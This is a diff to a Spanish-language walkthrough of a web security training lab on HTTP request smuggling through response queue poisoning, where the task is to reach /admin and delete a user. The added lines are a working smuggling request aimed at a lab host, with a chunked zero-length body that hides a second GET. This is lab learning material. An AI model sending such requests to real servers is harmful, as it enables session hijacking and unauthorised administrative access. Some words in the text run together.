@@ -168,3 +168,12 @@ Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor 
 Para resolver el laboratorio, elimine el usuario. carlosmediante el uso del envenenamiento de la cola de respuesta para entrar en el panel de administración en /adminUn usuario administrador iniciará sesión aproximadamente cada 15 segundos.
 
 La conexión con el back-end se restablece cada 10 solicitudes, así que no te preocupes si la colocas en mal estado: simplemente envía algunas solicitudes normales para obtener una nueva conexión. 
+
+```
+POST /x HTTP/2
+Host: 0a2100b80418302481b348380024001d.web-security-academy.net
+Transfer-Encoding: chunked
+0
+GET /x HTTP/1.1
+Host: 0a2100b80418302481b348380024001d.web-security-academy.net
+```
